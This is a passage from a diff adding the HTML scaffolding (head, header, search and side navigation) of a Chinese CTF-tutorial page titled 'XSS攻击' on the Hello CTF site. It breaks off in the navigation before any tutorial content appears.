@@ -1,0 +1,5886 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+      
+      
+        <meta name="author" content="探姬">
+      
+      
+        <link rel="canonical" href="https://hello-ctf.com/hc-web/xss/">
+      
+      
+        <link rel="prev" href="../sql_injection/">
+      
+      
+        <link rel="next" href="../include/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.3">
+    
+    
+      
+        <title>XSS攻击 - Hello CTF</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+SC:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans SC";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.16.8/katex.min.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/bannerSlider.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xsscross-site-scripting" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="Hello CTF" class="md-header__button md-logo" aria-label="Hello CTF" data-md-component="logo">
+      
+  <img src="../../assets/images/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hello CTF
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XSS攻击
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Hello-CTF
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../home/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Home
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../hc-tags/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  知识点标签
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../Event/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  赛事
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../hc-labs/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  靶场
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../hc-toolkit/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  工具
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../hc-archive/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  归档
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Hello CTF" class="md-nav__button md-logo" aria-label="Hello CTF" data-md-component="logo">
+      
+  <img src="../../assets/images/logo.png" alt="logo">
+
+    </a>
+    Hello CTF
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ProbiusOfficial/Hello-CTF" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Hello-CTF
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../home/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Home
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-start/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    快速开始
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    快速开始
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-preface/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    前言
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    前言
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-preface/about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    关于本书
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-preface/usage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    食用方法
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-preface/join/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    加入我们
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-env/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    环境设置
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1_4" id="__nav_1_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    环境设置
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-env/CTFtool/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    工具一览
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-env/Docker_On_Linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Docker环境
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-env/Crypto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Crypto环境设置
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-misc/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MISC | 杂项
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1_5" id="__nav_1_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    MISC | 杂项
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/osint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    信息收集
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/Encode_extra/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    编码扩展
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/file/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件基础
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/Archivefile/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    压缩包
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/stego/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    图片隐写
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/file_stego/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件隐写
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/audio_stego/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    音频隐写
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/pcap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    流量分析
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/industrial/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    工控类
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/memory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    内存取证
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-misc/file_sign/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    附:文件签名表
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_6" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web | 网络攻防
+  
+
+    
+  </span>
+  
+  
+
